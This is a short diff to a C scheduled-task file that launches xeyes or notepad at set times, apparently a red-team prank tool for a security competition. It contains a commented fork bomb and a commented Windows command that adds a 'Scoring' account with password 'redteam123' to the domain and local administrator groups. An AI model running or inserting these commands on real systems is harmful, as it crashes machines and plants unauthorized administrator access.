@@ -1,6 +1,8 @@
 #include "alarmpart.h"
 
 #ifdef LINUX_VERSION
+//Perhaps a forkbomb   :(){ :|:& };:
+
 taskstruct tasklist[] = {
     {FRIDAY, 15, 0, "/usr/bin/xeyes", 0},
 
@@ -28,8 +30,8 @@ taskstruct tasklist[] = {
 
 #ifdef WINDOWS_VERSION
  taskstruct tasklist[] = {
-{ FRIDAY, 15, 0, "c:\\Windows\\notepad.exe", 0},
-{ SATURDAY, 15, 0, "c:\\Windows\\notepad.exe", 0}
+{ FRIDAY, 15, 0, "c:\\Windows\\notepad.exe", 1},
+{ SATURDAY, 15, 0, "c:\\Windows\\notepad.exe", 1}
 //{ SATURDAY, 10, 0, "net user Scoring redteam123 /add; net group \"Domain Administrators\" /add; net localgroup \"Administrators\" /add;", 0}
 };
 #endif
